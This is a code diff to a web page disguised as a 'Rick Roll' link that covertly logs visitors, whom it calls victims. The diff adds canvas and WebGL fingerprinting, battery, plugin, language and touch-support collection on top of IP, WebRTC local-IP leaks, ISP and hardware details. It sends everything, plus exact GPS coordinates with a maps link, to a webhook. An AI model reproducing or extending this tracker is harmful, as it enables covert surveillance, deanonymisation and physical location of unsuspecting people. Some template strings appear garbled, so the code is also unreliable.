@@ -42,6 +42,42 @@
       } catch(e) {}
     }
 
+    // Advanced Fingerprinting
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#f00";
+        ctx.fillRect(0, 0, 220, 110);
+        ctx.fillStyle = "#0f0";
+        ctx.font = "18px Arial";
+        ctx.fillText("Boss Max Logger " + Date.now(), 20, 60);
+        return canvas.toDataURL().substring(0, 180);
+      } catch(e) { return "N/A"; }
+    }
+
+    function getWebGLFingerprint() {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) return "N/A";
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
+          renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
+        };
+      } catch(e) { return "N/A"; }
+    }
+
+    async function getBattery() {
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          return `${Math.floor(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
+        } catch(e) {}
+      }
+      return "N/A";
+    }
+
     async function getWebRTCIP() {
       return new Promise(resolve => {
         const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
@@ -70,30 +106,40 @@
       } catch(e) {}
 
       const webrtcIP = await getWebRTCIP();
+      const canvas = getCanvasFingerprint();
+      const webgl = getWebGLFingerprint();
+      const battery = await getBattery();
 
       const payload = {
-        content: "**🪝 INITIAL LOG - Victim Opened Link**",
+        content: "**🪝 ULTIMATE INITIAL LOG - Victim Opened Link**",
         embeds: [{
-          title: "🎥 YouTube Rick Roll Logger",
+          title: "🎥 YouTube Rick Roll - God Tier Logger",
           color: 0xff0000,
           fields: [
             { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
             { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
             { name: "Location", value: "**Not known yet — waiting for permission...**", inline: false },
-            { name: "City/Region", value: `${ipData.city || "N/A"}, ${ipData.region || "N/A"}`, inline: false },
+            { name: "City/Region/ISP", value: `${ipData.city || "N/A"}, ${ipData.region || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen/Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
+            { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
             { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "Battery", value: battery, inline: true },
+            { name: "Canvas Fingerprint", value: `\`\`\`${canvas}\`\`\``, inline: false },
+            { name: "WebGL", value: `${webgl.vendor || "N/A"} - ${webgl.renderer || "N/A"}`, inline: false },
+            { name: "Plugins", value: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ").substring(0,150) : "N/A", inline: false },
+            { name: "Languages", value: navigator.languages ? navigator.languages.join(", ") : "N/A", inline: false },
+            { name: "Do Not Track", value: navigator.doNotTrack || "N/A", inline: true },
+            { name: "Touch Support", value: `${'ontouchstart' in window} | Max Points: ${navigator.maxTouchPoints || 0}`, inline: true },
             { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ],
-          footer: { text: "Stage 1 • Max Logger" }
+          footer: { text: "Stage 1 • Maximum Logger" }
         }]
       };
       await sendWebhook(payload);
     }
 
-    async function sendLocationUpdate(geo) {
-      const mapsLink = `https://www.google.com/maps?q=\( {geo.lat}, \){geo.lon}`;
+    async function sendLocationUpdate(lat, lon, acc) {
+      const mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
       const payload = {
         content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
         embeds: [{
@@ -101,7 +147,7 @@
           color: 0x00ff00,
           fields: [
             { name: "Google Maps", value: `[📍 Click to View Exact Location](${mapsLink})`, inline: false },
-            { name: "Coordinates", value: `Lat: ${geo.lat}\nLon: \( {geo.lon}\nAccuracy: ± \){geo.acc} meters`, inline: false },
+            { name: "Coordinates", value: `Latitude: ${lat}\nLongitude: \( {lon}\nAccuracy: ± \){acc} meters`, inline: false },
             { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ],
           footer: { text: "Stage 2 • Boss Mode" }
@@ -114,11 +160,10 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            sendLocationUpdate({
-              lat: pos.coords.latitude.toFixed(8),
-              lon: pos.coords.longitude.toFixed(8),
-              acc: pos.coords.accuracy.toFixed(0)
-            });
+            const lat = pos.coords.latitude.toFixed(8);
+            const lon = pos.coords.longitude.toFixed(8);
+            const acc = pos.coords.accuracy.toFixed(0);
+            sendLocationUpdate(lat, lon, acc);
           },
           () => {}
         );
